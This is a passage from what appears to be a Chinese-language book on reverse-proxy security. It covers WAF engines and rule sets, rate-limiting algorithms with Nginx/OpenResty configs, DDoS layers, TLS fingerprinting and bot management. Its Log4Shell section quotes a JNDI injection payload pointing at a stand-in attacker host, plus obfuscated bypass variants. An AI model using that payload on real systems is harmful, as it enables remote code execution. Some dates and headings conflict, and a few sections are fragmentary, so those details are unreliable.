HAProxy 與 Nginx 不適合 Service Mesh — 它們的 reload model 不適合 sidecar 部署。Caddy / Traefik 也都嘗試過 Service Mesh（Traefik Mesh、Caddy 沒有官方），但都沒有成熟。

34.6 — API Gateway（Kong / APISIX / Envoy Gateway）

API Gateway 是 reverse proxy 之上的一層 — 處理認證、限流、API 文件、版本管理、計費。2026 年主流選項：

  • Kong Gateway：OpenResty-based，Lua plugin 生態豐富，2024+ 加入 AI Gateway

WAF 與限流
ModSecurity → Coraza、CRS 4 與 token bucket 演算法

Web Application Firewall（WAF）與 rate limit 是 reverse proxy 的兩個關鍵安全功能。本章解構 ModSecurity 從 Trustwave 轉到 OWASP（2024）、Coraza 作為 Go 寫的下一代引擎、CRS 4 規則集、token bucket vs leaky bucket 演算法，以及 Redis-backed 分散式限流。

Reverse proxy 在 2026 年的角色不只是「把請求轉給後端」 — 它還是第一道安全防線。WAF 過濾應用層攻擊（SQL injection、XSS、CSRF）；rate limit 防止濫用。本章覆蓋這兩個議題的工程實踐與 2026 年現況 — 包含一個重要的歷史事件：ModSecurity 在 2024 年從 Trustwave 轉到 OWASP，與其後 Coraza 作為 Go 寫的下一代 WAF 引擎崛起。

35.1 — WAF 的設計哲學：規則 vs ML

WAF 主要分兩派：

基於規則（rule-based）— 主流

  • 用人工編寫的規則匹配已知攻擊模式（如 SQL injection 的特徵字串）
  • 代表：ModSecurity / Coraza + OWASP CRS
  • 優點：可解釋、可審計、誤判可分析
  • 缺點：對 zero-day、混淆攻擊容易漏掉；維護規則庫成本高

基於 ML / 行為分析 — 雲端商業 WAF 主流

  • 用機器學習模型分析請求行為，識別異常
  • 代表：Cloudflare WAF、AWS WAF、Akamai Kona、F5 Distributed Cloud
  • 優點：能識別未知攻擊、自適應
  • 缺點：黑盒、誤判難解釋、需要海量訓練資料

2026 年的真實 WAF 部署通常是混合式：規則層做基本防護（CRS）+ ML 層做 anomaly detection。Cloudflare、AWS WAF 都這樣設計。純規則 WAF 在金融、政府等需要可解釋性的環境仍是主流。

35.2 — ModSecurity 的歷史與 2024 年轉折

ModSecurity 由 Ivan Ristić 在 2002 年首次發布，是世界第一個開源 WAF。歷史軌跡：

  • 2002：Ivan Ristić 釋出第一版（最初只支援 Apache mod_security）
  • 2006：Breach Security 收購
  • 2010：Trustwave 收購（隨後 Breach Security 被 Trustwave 整合）
  • 2017：ModSecurity 3 釋出（重寫為 libmodsecurity，從 Apache module 變成獨立 library，可整合到 Nginx 等）
  • 2021/08：Trustwave 宣布 ModSecurity 將於 2024 年 EOL
  • 2024/01/25：Trustwave 把 ModSecurity 轉移給 OWASP，OWASP 成立 OWASP ModSecurity 專案接手
  • 2024-2026：OWASP 與社群重新組織開發團隊，CI/CD 建立、CVE 處理流程上軌道

為什麼 Trustwave 想放手

OWASP CRS 團隊（同樣的 ModSecurity 規則維護者）2021 年公開分析：「ModSecurity 失去了活躍開發社群」。Trustwave 是商業安全公司，免費 ModSecurity 無法產生足夠營收支持持續投入。OWASP 接手後重新建立社群是「正確的事」。

OWASP 三件式

2024 年起 OWASP 旗下有三個 WAF 相關專案：

  • OWASP ModSecurity：傳統 C/C++ 引擎，仍是最廣泛部署的 WAF engine
  • OWASP Coraza：Go 寫的下一代 WAF library（cloud-native）
  • OWASP CRS（Core Rule Set）：兩個引擎共用的規則集

三個專案在 OWASP 共同治理下，目標是讓同一套規則能在 ModSecurity 與 Coraza 之間互相相容。

35.3 — Coraza：Go 寫的下一代 WAF

Coraza 由 Juan Pablo Tosso 在 2020 年開始開發，2022 年起成為 OWASP 旗下專案。設計目標：

  • Go 寫成：記憶體安全、易於部署（單一 binary）
  • 100% 相容 ModSecurity SecLang：既有 ModSecurity 規則直接用
  • library-first：核心是 library，能嵌入任何 Go 應用
  • Cloud-native：原生支援 WebAssembly，能在邊緣執行
  • 性能：避免 ModSecurity 的記憶體 overhead

Coraza 的整合

Coraza 是 library，需要透過 connector 整合到 web server：

  • caddy-coraza：Caddy plugin（最成熟）
  • traefik-coraza：Traefik plugin
  • coraza-spoa：HAProxy SPOA（Stream Processing Offload Agent）整合
  • coraza-server：standalone HTTP / gRPC server
  • nginx：實驗中

    • Coraza-aware（與 Coraza 引擎協作優化）

CRS 用 Paranoia Level (PL) 1-4 控制嚴謹度：

  • PL 2：中等嚴謹，更多攻擊偵測但誤判增加
  • PL 3：高嚴謹，需要仔細調校誤判

Cloudflare WAF

  • ML 層：Cloudflare Bot Management、Anomaly Detection
  • Cloudflare AI Labyrinth（2025/03 推出）：對 bot 提供假頁面 + 隱藏連結，污染 bot 資料

商業 WAF 的優勢：託管（不需運維 ModSecurity）、ML 層補強、龐大威脅情報網路。劣勢：規則黑盒（誤判難解釋）、高流量場景成本高、vendor lock-in。對中小企業，雲端商業 WAF 是最快上線的選擇；對需要客製化的大企業，ModSecurity / Coraza + 自管 CRS 仍有價值。

35.6 — Rate Limit 演算法：token bucket vs leaky bucket

限流（rate limit）是 reverse proxy 的另一個基本功能。兩個經典演算法：

Token Bucket（令牌桶）

Token Bucket 視覺化     ┌─────────────────────┐
     │  Token Bucket       │
     │                     │
     │    [T][T][T][T]     │  ← 桶子（最多放 burst 個 token）
     │    [T][T][T][ ]     │
     │                     │
     │  ↑ rate per sec     │
     │  填補 token         │
     └─────────────────────┘

  收到請求 → 從桶取 token
    有 token: 通過 + 移除 token
    無 token: 拒絕（或排隊）

  特性: 允許 burst（短時間內可全用桶內 token）
        平均速率受 fill rate 限制

Token bucket 的關鍵參數：

  • rate：每秒填補多少 token（平均速率）
  • burst：桶最大容量（短時最大 burst）

Nginx 的 limit_req 與 HAProxy 的 stick table、Envoy 的 local_rate_limit 都是 token bucket。

Leaky Bucket（漏桶）

Leaky Bucket 視覺化  收到請求 → 進入桶
            ↓
     ┌─────────────────────┐
     │ ▓▓▓▓▓             │  ← 桶子（請求隊列）
     │ ▓▓▓▓▓             │
     │ ▓▓▓▓▓             │
     │ ▓▓▓▓▓             │
     └─────┬───────────────┘
           │  rate per sec
           ▼  以固定速率漏出
        後端

  特性: 固定速率輸出（不允許 burst 對下游）
        滿了就拒絕新請求

Leaky bucket 對下游友好 — 後端永遠看到平穩流量。但對 client 不友好（短時 burst 會被拒）。

兩者比較

Token BucketLeaky Bucket
對 client友好（允許 burst）嚴格（固定速率）
對 serverburst 會打到平穩，受保護
適用API rate limit、面向 client後端保護、隊列調度
常見實作Nginx limit_req、HAProxyNginx limit_conn、訊息隊列

Nginx 的 limit_req 預設行為其實是「token bucket 但無 burst」，加 burst=N 才允許 burst。所以 Nginx 的限流其實兩種都能做。

35.7 — Nginx limit_req_zone：實戰

Listing 35.2 · Nginx 限流完整配置# http context：定義 rate limit zone
http {
    # 以 client IP 為 key、shared memory 10MB（約 16 萬個 IP）
    # rate=10r/s 表示平均 10 RPS
    limit_req_zone $binary_remote_addr zone=per_ip:10m rate=10r/s;

    # 以 user_id (從 cookie) 為 key、平均 100 RPS
    limit_req_zone $cookie_user_id zone=per_user:10m rate=100r/s;

    server {
        location /api/ {
            # 套用 limit：burst=20 表示最多排隊 20 個請求
            # nodelay 表示前 20 個請求立即處理（不排隊）
            limit_req zone=per_ip burst=20 nodelay;

            # 觸發限流時的 status code（預設 503，常用 429）
            limit_req_status 429;

            proxy_pass http://backend;
        }

        location /api/expensive/ {
            # 對昂貴 API 套用更嚴格的限制（兩條都套）
            limit_req zone=per_ip burst=5 nodelay;
            limit_req zone=per_user burst=10;
            limit_req_status 429;

            proxy_pass http://backend;
        }
    }
}

limit_req 的三種模式

  • 無 burst：嚴格 token bucket，超過 rate 立即 503
  • burst=N（預設）：burst 內請求進排隊延遲處理
  • burst=N nodelay：burst 內請求立即處理，超過才拒絕（最常用）

35.8 — 分散式 Rate Limit：Redis-backed

Nginx 的 limit_req_zone 用 shared memory，只在單一 Nginx instance 內生效。多個 Nginx 後端時，client 可能同時被多台 Nginx 服務，總計超出 rate limit。

兩種解法

方法 1：sticky session — 同一 client 永遠進同一 Nginx，limit 自然在單一 instance 內。但 Nginx 規模化時不易維持。

方法 2：分散式 store（Redis-backed）— 把 rate limit state 放到共享 Redis。常見實作：

  • OpenResty + lua-resty-limit-traffic：完整的 Lua 限流套件，支援多種演算法 + Redis
  • Envoy global rate limit service：透過 ratelimit gRPC service 與 Redis 整合
  • Kong rate-limiting plugin：可選 local / cluster / Redis 後端
  • HAProxy + peers protocol：在 HAProxy cluster 內同步 stick tables（cf. Ch.30 §30.5）— 不需 Redis
Listing 35.3 · OpenResty + Redis 分散式限流（簡化）access_by_lua_block {
    local redis = require "resty.redis"
    local red = redis:new()
    red:set_timeout(100)
    red:connect("redis-cluster", 6379)

    local key = "ratelimit:" .. ngx.var.remote_addr
    local count, err = red:incr(key)
    if count == 1 then
        red:expire(key, 60)        -- 60 秒視窗
    end
    red:set_keepalive(10000, 100)

    if count > 100 then     -- 每分鐘 100 請求
        ngx.header["Retry-After"] = "60"
        ngx.header["X-RateLimit-Remaining"] = "0"
        ngx.exit(429)
    end

    ngx.header["X-RateLimit-Limit"] = "100"
    ngx.header["X-RateLimit-Remaining"] = tostring(100 - count)
}

這是 fixed window 演算法的簡化版。生產環境通常用 sliding window（更平滑）或 token bucket（含 burst）。lua-resty-limit-traffic 提供現成的高品質實作。

35.9 — 給 client 的限流訊號

合格的限流不只是「拒絕」，還要告訴 client 該怎麼做：

  • HTTP 429 Too Many Requests（RFC 6585, 2012）— 標準狀態碼
  • Retry-After header — 告訴 client 多久後可重試
  • X-RateLimit-Limit — 配額總量
  • X-RateLimit-Remaining — 剩餘額度
  • X-RateLimit-Reset — 配額重置時間（Unix timestamp）

這些 header 雖然不是正式 RFC 標準，但事實上是業界共識（GitHub API、Twitter API、Stripe API 等都採用）。寫得好的 client SDK 會看這些 header 自動退避重試，提供良好的開發者體驗。

本章要點
  • WAF 兩派：規則型（ModSecurity / Coraza + CRS）+ ML 型（Cloudflare / AWS WAF）。
  • 2024/01 ModSecurity 從 Trustwave 轉到 OWASP，與 Coraza、CRS 三件式整合。
  • Coraza是 Go 寫的 cloud-native WAF library，100% 相容 ModSecurity SecLang，支援 WebAssembly。
  • CRS 4.25.0 LTS（2026）是當前主線，CRS 3.3 支援到 2026/Q3。
  • Paranoia Level 1-4控制嚴謹度，從 PL 1 detection mode 開始是運維最佳實踐。
  • Token bucket vs leaky bucket：前者允許 burst（API rate limit 主流）、後者固定速率（保護後端）。
  • 分散式限流：OpenResty + Redis、Envoy global rate limit、HAProxy peers。
  • 給 client 的訊號：429 + Retry-After + X-RateLimit-* 是業界共識。

DDoS 與機器人管理
L3/4 與 L7 防護、JA4 指紋、Turnstile 與 AI agent 時代的模糊邊界

Reverse proxy 的最後安全議題。本章覆蓋 L3/4 vs L7 DDoS 攻擊與防護、JA3/JA4 TLS 指紋（cf. Ch.11）、CAPTCHA 演進到 Cloudflare Turnstile、Cloudflare AI Labyrinth（2025/03），以及 2026 年最棘手的問題：當 AI agent 行為與真人難以區分，bot management 該往何處？

DDoS 與 bot 管理是 reverse proxy 安全議題的最後一塊。但這也是最不可能透過開源工具完整解決的領域 — 規模化的 DDoS 防護需要 Cloudflare / Akamai / AWS Shield 等雲端服務的全球 anycast 網路，個別 reverse proxy 能做的有限。本章誠實面對這個限制，同時涵蓋你能在自家 reverse proxy 做什麼、什麼必須交給雲端服務，以及 2026 年 AI agent 普及後 bot management 面臨的根本性挑戰。

36.1 — DDoS 攻擊的層級

DDoS 攻擊依攻擊層級分為三類，每類需要完全不同的防禦：

層級攻擊範例典型規模防禦
L3 (Network)UDP flood、ICMP flood、放大攻擊（amplification）1 Tbps+雲端 DDoS 防護（必要）
L4 (Transport)SYN flood、TCP RST flood數百 Gbps雲端 + 上游 ISP 過濾
L7 (Application)HTTP flood、Slowloris、API abuse數萬-百萬 RPSWAF、rate limit、bot management

L3/4 攻擊：自己無法處理

L3/4 DDoS 在 2026 年達到數 Tbps 級別規模。Cloudflare 2025/10 報告攻擊規模峰值達 5.6 Tbps + 6.5 億 PPS。這個體量遠超任何單一企業的對外頻寬 — 攻擊封包還沒到達你的 reverse proxy，你的網路通道就已堵塞。

L3/4 防護必須在雲端 / ISP 層級完成：

  • Cloudflare Magic Transit（L3 防護）+ Cloudflare DDoS（L7）
  • AWS Shield Standard（免費，自動）+ Shield Advanced（$3K/月，配 WAF + DRT 團隊）
  • Akamai Prolexic
  • Imperva DDoS
  • Radware DefensePro（傳統電信運營商）

L7 攻擊：你的 reverse proxy 該處理

L7 攻擊（HTTP flood、Slowloris、API abuse）規模較小但難偵測 — 攻擊流量看起來像正常請求。這是你的 reverse proxy 該處理的領域：

  • connection limits：限制單 IP 同時連線數（Nginx limit_conn）
  • request rate limits：限制單 IP / user / endpoint 的 RPS（§35.6-35.8）
  • slow read 防護：對 read 速度過慢的連線斷線（Slowloris）
  • large body 防護：限制 request body 大小
  • Bot management：偵測自動化流量（§36.3+）
Listing 36.1 · Nginx L7 DDoS 防護基本配置http {
    # 連線數限制（每 IP 最多 20 條同時連線）
    limit_conn_zone $binary_remote_addr zone=conn_per_ip:10m;

    # 請求數限制（每 IP 平均 30 RPS）
    limit_req_zone $binary_remote_addr zone=req_per_ip:10m rate=30r/s;

    # Slow read 防護
    client_body_timeout 10s;
    client_header_timeout 10s;
    send_timeout 10s;

    # Body 與 header 大小
    client_max_body_size 1m;       # 一般網站 1MB 足夠
    client_body_buffer_size 16k;
    large_client_header_buffers 4 8k;

    server {
        # 每 server 套用兩個 limit zone
        limit_conn conn_per_ip 20;
        limit_req zone=req_per_ip burst=50 nodelay;
        limit_req_status 429;

        # 拒絕未知 User-Agent（簡單 bot 防護，誤殺風險高）
        if ($http_user_agent = "") {
            return 403;
        }

        location / {
            proxy_pass http://backend;
        }
    }
}

這個基本配置能擋 80% 的業餘 L7 攻擊。對專業攻擊者使用 botnet + residential proxy + 真實 User-Agent，這個配置遠遠不夠 — 需要 §36.3 起的 bot management。

36.2 — 2025-2026 年的真實 DDoS 事件

2025 年值得注意的 DDoS 事件

• 2024/10 Cloudflare 5.6 Tbps + 6.5 億 PPS 攻擊：Mirai-variant botnet 從 13K+ IoT 裝置發動，目標亞洲 ISP 客戶

• 2024/12 多個遊戲產業 L7 攻擊：使用 residential proxy 池發動，每秒 50M+ 請求

• 2025-2026 年 HTTP/2 Rapid Reset 攻擊：CVE-2023-44487 變種，用 HTTP/2 stream cancellation 製造放大效應，影響 Nginx、HAProxy、Envoy

• 2025 年加密貨幣交易所成主要目標：DDoS as a service（DDoSaaS）讓進入門檻極低（USD $5/小時）

這些事件的共同主題：規模持續擴大、技術持續精進、防禦的責任越來越向雲端服務集中。

36.3 — Bot Management：JA3 / JA4 TLS 指紋

Ch.11 §11.7 介紹過 JA3 / JA4 TLS 指紋。Bot management 是這個技術最大的應用場景。

JA3 vs JA4：2025-2026 過渡

  • JA3（2017，John Althouse）：把 ClientHello 的 TLS 版本、cipher suites、extensions、curves 等 hash 成 32 字元 MD5。簡單但脆弱（Chrome extension order 隨機化破壞穩定性）
  • JA4（2024 推出，2025-2026 主流）：JA4+ 系列指紋，排序 extensions 後再 hash，對 randomization 穩定。可讀格式（如 t13d1517h2_8daaf6152771_b186095e22b6）

2026 年 Cloudflare、Akamai、AWS WAF 等都已採用 JA4 取代 JA3。Cloudflare Bot Management 的 Signals Intelligence提供每個 JA4 的全網統計：在多少 ASN 出現、被多少網站看到、bot vs human 比例 — 變相把 Cloudflare 的全球流量觀察轉為威脅情報。

為什麼 JA4 有效

每個 TLS client 的 ClientHello 因 library 實作差異產生獨特指紋：

  • Chrome / Firefox / Safari 各有獨特 JA4
  • Python requests / urllib3 各有獨特 JA4
  • curl 各版本 JA4 不同
  • headless Chromium / Playwright / Puppeteer 預設指紋與真實 Chrome 不同

當 client 聲稱是 Chrome（User-Agent 偽造）但 JA4 卻是 Python，Cloudflare 立即標記為 bot。這是 2025-2026 年 bot management 的核心檢測手段之一。

攻防的軍備競賽

Bot 開發者反制：

  • 使用 curl-impersonate：偽造特定 Chrome 版本的 TLS 指紋
  • 使用 hardened headless browser（Camoufox、SeleniumBase UC Mode）
  • 用 mobile / residential proxy + 真實 mobile JA4
  • 透過真實 Chrome (NaiveProxy 模式 cf. Ch.22 §22.8) 發出請求

這個軍備競賽 2026 年遠未結束。JA4 不是銀彈，是 bot management 的一個訊號。

36.4 — CAPTCHA 演進：reCAPTCHA → Turnstile

CAPTCHA（Completely Automated Public Turing test to tell Computers and Humans Apart）由 Carnegie Mellon 在 2000 年代提出，至今 25 年演進：

CAPTCHA 的演進

世代機制使用體驗2026 狀態
v1：扭曲文字讀懂變形字母★（差）多被 OCR 與雲端 solver 突破
v2：reCAPTCHA "I'm not a robot"勾選框 + 行為分析★★★Google 仍提供，但 bot 高成功率突破

Cloudflare Turnstile：無感 CAPTCHA

Turnstile（2022 年推出）是 Cloudflare 的 CAPTCHA 替代品。三種運作模式：

  • Managed（managed challenge，預設）：完全背景，使用者無感
  • Non-Interactive（invisible）：簡短背景檢查（<1 秒）
  • Interactive：顯示勾選框（需要使用者點一下）

Turnstile 的檢查項目：

  • 瀏覽器 fingerprint（Canvas、WebGL、AudioContext）
  • TLS / HTTP/2 fingerprint（JA4、HTTP/2 frame order）
  • 行為分析（mouse movement、click pattern、dwell time）
  • Proof-of-Work（小量計算工作）
  • Cloudflare 的 IP 信譽分數

多項目綜合計算「trust score」。Score 高直接通過、score 中等彈出 challenge、score 低直接拒絕。Turnstile 在 2024-2026 年成為 reCAPTCHA 的主要替代品，特別是因為 Google 漸漸把 reCAPTCHA 商業化（前 1M 免費、超過要付費）而 Turnstile 完全免費。

36.5 — Cloudflare AI Labyrinth：誘餌系統

2025/03 Cloudflare 推出 AI Labyrinth，是 bot management 最有創意的反擊：

運作機制：

  1. 偵測為 bot 後，不直接拒絕，而是把它導向 AI 生成的假頁面
  2. 假頁面有真實的 HTML / CSS / 圖片，看起來與真網站類似
  3. 頁面內含隱藏連結（人類看不到，bot scraper 會跟）
  4. Bot 跟連結進入更多假頁面，無限遞迴
  5. Bot 浪費 compute、儲存假資料、訓練資料污染

AI Labyrinth 的目的不是「擋 bot」（傳統做法），而是「讓 bot 浪費資源並污染 scraping 資料」。對 AI training scraper（如未經授權爬全網訓練 LLM）特別有效 — 大量假內容會混入訓練資料降低模型品質。

這個策略反映了 2025-2026 年 web 防禦的範式轉移：從「拒絕 bot」到「讓 bot 為自己付出代價」。

36.6 — AI agent 時代：bot vs human 的模糊邊界

2024-2026 年最棘手的 bot management 問題不是「如何更好識別 bot」，而是「什麼算 bot？」

AI agent 的興起

2024-2026 年的 AI agent（ChatGPT Operator、Claude Computer Use、Anthropic 的 Computer Use API、Browser Use 等）在做以下事情：

  • 代表使用者操作網站（訂機票、買東西、預約餐廳）
  • 填表單、點按鈕、登入帳號
  • 使用真實的 Chromium 瀏覽器（指紋與真人接近）
  • 有明確的人類授權與意圖

傳統 bot management 會把這些 agent 標記為 bot 並擋下。但這是 bot 嗎？ 它代表真人意圖、有真人授權、結果為真人服務。把 AI agent 一律當 bot 阻擋會讓很多合法場景受影響。

2026 年的兩種應對

應對 1：簽章與身分識別。讓 AI agent 攜帶可驗證的身分（如 OpenAI 簽章、Anthropic 簽章），bot management 對可驗證 agent放行、對偽裝 bot仍阻擋。Cloudflare 2025 年起與 OpenAI、Anthropic 等合作探索這個方向。

應對 2：差異化計費與 throttling。AI agent 流量比真人慢且少，但用 API / 付費通道明確標記，反而讓網站能區別計費。如 Reddit、Twitter / X 在 2023-2024 年強化 API 收費，部分動機就是把「AI 訓練資料爬取」變成商業關係而非對抗。

這個議題與 Part V（AI 時代的 Proxy）緊密相關，會在 Ch.45 進一步展開。

36.7 — Zero-day 防護的真實限制

本書一直避免賣 WAF / DDoS 廠商的 marketing 故事。誠實面對：Zero-day 攻擊在發生時，沒有任何 reverse proxy 或 WAF 能完全防住。

真實案例：Log4Shell（CVE-2021-44228）

2021/12 揭露的 Log4Shell（log4j JNDI injection）是 21 世紀最嚴重的 RCE 之一。攻擊載荷極簡：${jndi:ldap://attacker.com/x}。攻擊面廣到難以想像 — 任何寫到 log 的字串都可能觸發（User-Agent、Referer、URL、Authorization header...）。

第一週的 WAF 反應：

  1. Day 1（2021/12/09）：揭露當天，Cloudflare、AWS WAF、CRS 緊急部署規則匹配 ${jndi:
  2. Day 2-3：攻擊者用 obfuscation 繞過：${${lower:j}ndi:...}、${${::-j}ndi:...}、Base64 等
  3. Day 4-7：WAF 規則持續更新捕捉變種，但新變種比規則快
  4. Week 2+：根本解法是 patch log4j，WAF 規則只是緩解

Log4Shell 的教訓：WAF 是「縱深防禦」的一層，不是唯一防線。應用層必須及時 patch；reverse proxy 的 WAF 規則只是buy time。

2025-2026 年新的 Zero-day

  • Spring4Shell（CVE-2022-22965）：Spring Framework RCE
  • Citrix NetScaler 多個 CVE（cf. Ch.33 §33.3）：包括 CitrixBleed
  • HTTP/2 Rapid Reset（CVE-2023-44487）：影響所有主流 web server
  • GoAhead embedded server CVEs：影響 IoT 設備

這些 zero-day 都讓 WAF 規則庫與廠商緊急響應，但沒有任何 WAF 在揭露當下就有完整保護。誠實的 reverse proxy 工程師應該理解這個限制。

36.8 — 工程師的縱深防禦原則

Part IV 結尾，給 reverse proxy / WAF 工程師的元原則：

  1. 多層防禦：CDN（DDoS）→ 邊界 LB（WAF）→ 應用層驗證 → 後端 sandbox。沒有單一防線
  2. WAF 是緩解不是 fix：應用層必須持續修補，WAF 不該成為偷懶藉口
  3. 從寬鬆規則開始：CRS PL 1 detection mode 至少跑兩週收集 false positive，再切換 prevention
  4. 針對性勝過通用性：你網站的特定攻擊模式比 OWASP CRS 更值得規則化
  5. 觀察性是核心：沒有 log 與 metrics 的 WAF 是擺設。每個 deny / challenge 都該可追溯
  6. Bot management 不是非黑即白：給 bot 不同等級的回應（slow、challenge、deny），保留好 bot（搜尋引擎、合作 API）
  7. 規模問題交給雲端：1 Tbps DDoS 不可能自己擋，這是錢買的問題，不是工程問題
  8. AI agent 是新興議題：別把 2024+ 的 agent 流量一律當 bot 拒絕，思考身分識別與差異化計費
